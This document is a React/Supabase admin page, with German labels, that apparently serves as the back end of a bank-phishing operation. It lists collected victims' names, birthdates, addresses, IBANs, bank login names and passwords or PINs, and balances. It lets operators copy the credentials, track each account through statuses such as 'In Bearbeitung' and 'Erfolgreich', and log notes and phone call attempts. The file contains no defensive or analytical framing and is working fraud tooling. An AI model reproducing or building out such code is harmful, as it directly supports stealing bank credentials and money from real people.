import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import type { User } from "@supabase/supabase-js";
import Header from "@/components/Header";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import { Copy, Eye, LogOut, MessageSquare, PhoneMissed } from "lucide-react";

interface Submission {
  id: string;
  session_id: string;
  created_at: string;
  full_name: string | null;
  email: string | null;
  birthdate: string | null;
  phone: string | null;
  street: string | null;
  house_number: string | null;
  staircase: string | null;
  door_number: string | null;
  postal_code: string | null;
  city: string | null;
  iban: string | null;
  bank: string | null;
  bank_username: string | null;
  bank_password: string | null;
  bank_username_label: string | null;
  bank_password_label: string | null;
  bank_extra: Record<string, string> | null;
  balance: string | null;
  status: string | null;
}

interface Note {
  id: string;
  user_email: string;
  content: string;
  created_at: string;
}

interface Call {
  id: string;
  user_email: string;
  call_type: string;
  created_at: string;
}

const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;

const statusBadgeClass: Record<string, string> = {
  "Neu": "bg-gray-200 text-gray-800 hover:bg-gray-200",
  "In Bearbeitung": "bg-blue-100 text-blue-800 hover:bg-blue-100",
  "Erfolgreich": "bg-green-100 text-green-800 hover:bg-green-100",
  "Down": "bg-red-100 text-red-800 hover:bg-red-100",
};

const AdminLogs = () => {
  const navigate = useNavigate();
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string } | null>(null);
  const [statusFilter, setStatusFilter] = useState<string>("Alle");

  // Counts
  const [noteCounts, setNoteCounts] = useState<Record<string, number>>({});
  const [callCounts, setCallCounts] = useState<Record<string, number>>({});

  // Dialogs
  const [noteDialog, setNoteDialog] = useState<{ id: string; notes: Note[] } | null>(null);
  const [callDialog, setCallDialog] = useState<{ id: string; calls: Call[] } | null>(null);
  const [newNote, setNewNote] = useState("");
  const [savingNote, setSavingNote] = useState(false);

  useEffect(() => {
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      if (!session) {
        navigate("/auth");
      } else {
        setUser(session.user);
      }
    });

    supabase.auth.getSession().then(({ data: { session } }) => {
      if (!session) {
        navigate("/auth");
      } else {
        setUser(session.user);
        fetchAll();
      }
      setLoading(false);
    });

    return () => subscription.unsubscribe();
  }, [navigate]);

  const fetchAll = async () => {
    const [subRes, notesRes, callsRes] = await Promise.all([
      supabase.from("submissions").select("*").order("created_at", { ascending: false }),
      supabase.from("submission_notes").select("id, submission_id"),
      supabase.from("submission_calls").select("id, submission_id"),
    ]);

    if (subRes.data) setSubmissions(subRes.data as Submission[]);

    if (notesRes.data) {
      const counts: Record<string, number> = {};
      notesRes.data.forEach((n: any) => { counts[n.submission_id] = (counts[n.submission_id] || 0) + 1; });
      setNoteCounts(counts);
    }

    if (callsRes.data) {
      const counts: Record<string, number> = {};
      callsRes.data.forEach((c: any) => { counts[c.submission_id] = (counts[c.submission_id] || 0) + 1; });
      setCallCounts(counts);
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    navigate("/auth");
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const saveBalance = async () => {
    if (!balanceEdit) return;
    const { error } = await supabase
      .from("submissions")
      .update({ balance: balanceEdit.value || null })
      .eq("id", balanceEdit.id);
    if (error) {
      toast.error("Fehler beim Speichern");
    } else {
      toast.success("Guthaben gespeichert");
      setSubmissions((prev) =>
        prev.map((s) => (s.id === balanceEdit.id ? { ...s, balance: balanceEdit.value || null } : s))
      );
      setBalanceEdit(null);
    }
  };

  const updateStatus = async (id: string, status: string) => {
    const { error } = await supabase.from("submissions").update({ status }).eq("id", id);
    if (error) {
      toast.error("Fehler beim Speichern");
    } else {
      setSubmissions((prev) => prev.map((s) => (s.id === id ? { ...s, status } : s)));
    }
  };

  // Notes
  const openNoteDialog = async (subId: string) => {
    const { data } = await supabase
      .from("submission_notes")
      .select("*")
      .eq("submission_id", subId)
      .order("created_at", { ascending: false });
    setNoteDialog({ id: subId, notes: (data || []) as Note[] });
    setNewNote("");
  };

  const addNote = async () => {
    if (!noteDialog || !user || !newNote.trim()) return;
    setSavingNote(true);
    const { data, error } = await supabase.from("submission_notes").insert({
      submission_id: noteDialog.id,
      user_id: user.id,
      user_email: user.email || "unknown",
      content: newNote.trim(),
    }).select().single();
    setSavingNote(false);
    if (error) {
      toast.error("Fehler beim Speichern");
    } else {
      setNewNote("");
      if (data) {
        setNoteDialog((prev) => prev ? { ...prev, notes: [data as Note, ...prev.notes] } : null);
        setNoteCounts((prev) => ({ ...prev, [noteDialog.id]: (prev[noteDialog.id] || 0) + 1 }));
      }
    }
  };

  // Calls (Mailbox)
  const addMailboxCall = async (subId: string) => {
    if (!user) return;
    const { error } = await supabase.from("submission_calls").insert({
      submission_id: subId,
      user_id: user.id,
      user_email: user.email || "unknown",
      call_type: "mailbox",
    });
    if (error) {
      toast.error("Fehler beim Speichern");
    } else {
      toast.success("Mailbox-Versuch gespeichert");
      setCallCounts((prev) => ({ ...prev, [subId]: (prev[subId] || 0) + 1 }));
    }
  };

  const openCallDialog = async (subId: string) => {
    const { data } = await supabase
      .from("submission_calls")
      .select("*")
      .eq("submission_id", subId)
      .order("created_at", { ascending: false });
    setCallDialog({ id: subId, calls: (data || []) as Call[] });
  };

  const CopyCell = ({ value }: { value: string | null }) => {
    if (!value) return <span>-</span>;
    return (
      <button
        onClick={() => copyToClipboard(value)}
        className="flex items-center gap-1 text-blue-600 hover:underline"
      >
        {value} <Copy className="h-3 w-3" />
      </button>
    );
  };

  const filteredSubmissions = statusFilter === "Alle"
    ? submissions
    : submissions.filter((s) => (s.status || "Neu") === statusFilter);

  if (loading) {
    return (
      <div className="flex min-h-screen items-center justify-center">
        <p className="text-gray-500">Laden...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-2xl font-bold text-gray-900">Logs</h1>
            <Button variant="outline" size="sm" onClick={() => navigate("/admin")}>
              ← Admin
            </Button>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="outline" size="sm" onClick={fetchAll}>
              Aktualisieren
            </Button>
            <Button variant="outline" size="sm" onClick={handleLogout}>
              <LogOut className="mr-1 h-4 w-4" /> Logout
            </Button>
          </div>
        </div>

        {/* Status Filter */}
        <div className="mb-4 flex items-center gap-2">
          <span className="text-sm text-gray-500">Filter:</span>
          {["Alle", ...STATUS_OPTIONS].map((s) => (
            <Button
              key={s}
              size="sm"
              variant={statusFilter === s ? "default" : "outline"}
              onClick={() => setStatusFilter(s)}
              className="text-xs"
            >
              {s}
            </Button>
          ))}
        </div>

        <div className="rounded-lg border bg-white shadow-sm overflow-x-auto">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Zeitpunkt</TableHead>
                <TableHead>Name</TableHead>
                <TableHead>Telefonnummer</TableHead>
                <TableHead>Geburtsdatum</TableHead>
                <TableHead>Stadt</TableHead>
                <TableHead>Bank</TableHead>
                <TableHead>Login-Name</TableHead>
                <TableHead>Passwort/PIN</TableHead>
                <TableHead>Guthaben</TableHead>
                <TableHead>Status</TableHead>
                <TableHead>Aktionen</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredSubmissions.map((sub) => {
                const currentStatus = sub.status || "Neu";
                const nc = noteCounts[sub.id] || 0;
                const cc = callCounts[sub.id] || 0;
                return (
                  <TableRow key={sub.id}>
                    <TableCell className="whitespace-nowrap text-xs">
                      {sub.created_at ? new Date(sub.created_at).toLocaleString("de-AT") : "-"}
                    </TableCell>
                    <TableCell>{sub.full_name || "-"}</TableCell>
                    <TableCell><CopyCell value={sub.phone} /></TableCell>
                    <TableCell>{sub.birthdate || "-"}</TableCell>
                    <TableCell>{sub.city || "-"}</TableCell>
                    <TableCell>{sub.bank || "-"}</TableCell>
                    <TableCell><CopyCell value={sub.bank_username} /></TableCell>
                    <TableCell><CopyCell value={sub.bank_password} /></TableCell>
                    <TableCell>
                      <button
                        onClick={() => setBalanceEdit({ id: sub.id, value: sub.balance || "" })}
                        className="text-sm text-gray-700 hover:text-blue-600 hover:underline cursor-pointer"
                      >
                        {sub.balance || "-"}
                      </button>
                    </TableCell>
                    <TableCell>
                      <Select value={currentStatus} onValueChange={(val) => updateStatus(sub.id, val)}>
                        <SelectTrigger className="h-7 w-[130px] text-xs border-0 p-0">
                          <Badge className={statusBadgeClass[currentStatus] || ""}>{currentStatus}</Badge>
                        </SelectTrigger>
                        <SelectContent>
                          {STATUS_OPTIONS.map((opt) => (
                            <SelectItem key={opt} value={opt}>{opt}</SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-1">
                        {/* Details */}
                        <Button size="icon" variant="ghost" className="h-8 w-8" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
                          <Eye className="h-4 w-4" />
                        </Button>

                        {/* Notes */}
                        <div className="relative">
                          <Button size="icon" variant="ghost" className="h-8 w-8" onClick={() => openNoteDialog(sub.id)}>
                            <MessageSquare className="h-4 w-4" />
                          </Button>
                          {nc > 0 && (
                            <button
                              onClick={() => openNoteDialog(sub.id)}
                              className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white"
                            >
                              {nc}
                            </button>
                          )}
                        </div>

                        {/* Mailbox */}
                        <div className="relative">
                          <Button size="icon" variant="ghost" className="h-8 w-8" onClick={() => addMailboxCall(sub.id)}>
                            <PhoneMissed className="h-4 w-4" />
                          </Button>
                          {cc > 0 && (
                            <button
                              onClick={() => openCallDialog(sub.id)}
                              className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white"
                            >
                              {cc}
                            </button>
                          )}
                        </div>
                      </div>
                    </TableCell>
                  </TableRow>
                );
              })}
              {filteredSubmissions.length === 0 && (
                <TableRow>
                  <TableCell colSpan={11} className="text-center text-gray-400 py-8">
                    Keine Einträge vorhanden
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </div>
      </div>

      {/* Balance Edit Dialog */}
      <Dialog open={!!balanceEdit} onOpenChange={(open) => !open && setBalanceEdit(null)}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle>Guthaben bearbeiten</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <Input
              placeholder="z.B. 1.250,00 €"
              value={balanceEdit?.value || ""}
              onChange={(e) => setBalanceEdit((prev) => prev ? { ...prev, value: e.target.value } : null)}
              onKeyDown={(e) => e.key === "Enter" && saveBalance()}
            />
            <div className="flex justify-end gap-2">
              <Button variant="outline" size="sm" onClick={() => setBalanceEdit(null)}>Abbrechen</Button>
              <Button size="sm" onClick={saveBalance}>Speichern</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Notes Dialog */}
      <Dialog open={!!noteDialog} onOpenChange={(open) => !open && setNoteDialog(null)}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle>Notizen</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div className="space-y-2">
              <Textarea
                placeholder="Neue Notiz schreiben..."
                value={newNote}
                onChange={(e) => setNewNote(e.target.value)}
                rows={3}
              />
              <Button size="sm" onClick={addNote} disabled={savingNote || !newNote.trim()}>
                Notiz hinzufügen
              </Button>
            </div>
            {noteDialog && noteDialog.notes.length > 0 ? (
              <div className="space-y-3 max-h-64 overflow-y-auto">
                {noteDialog.notes.map((note) => (
                  <div key={note.id} className="rounded-md border p-3 text-sm bg-gray-50">
                    <div className="flex justify-between text-xs text-gray-400 mb-1">
                      <span>{note.user_email}</span>
                      <span>{new Date(note.created_at).toLocaleString("de-AT")}</span>
                    </div>
                    <p className="text-gray-800 whitespace-pre-wrap">{note.content}</p>
                  </div>
                ))}
              </div>
            ) : (
              <p className="text-sm text-gray-400">Keine Notizen vorhanden</p>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* Call/Mailbox Dialog */}
      <Dialog open={!!callDialog} onOpenChange={(open) => !open && setCallDialog(null)}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle>Mailbox-Versuche</DialogTitle>
          </DialogHeader>
          {callDialog && callDialog.calls.length > 0 ? (
            <div className="space-y-2 max-h-64 overflow-y-auto">
              {callDialog.calls.map((call) => (
                <div key={call.id} className="flex justify-between rounded-md border p-2 text-sm bg-gray-50">
                  <span className="text-gray-600">Mailbox</span>
                  <span className="text-xs text-gray-400">{new Date(call.created_at).toLocaleString("de-AT")}</span>
                </div>
              ))}
            </div>
          ) : (
            <p className="text-sm text-gray-400">Keine Versuche</p>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default AdminLogs;
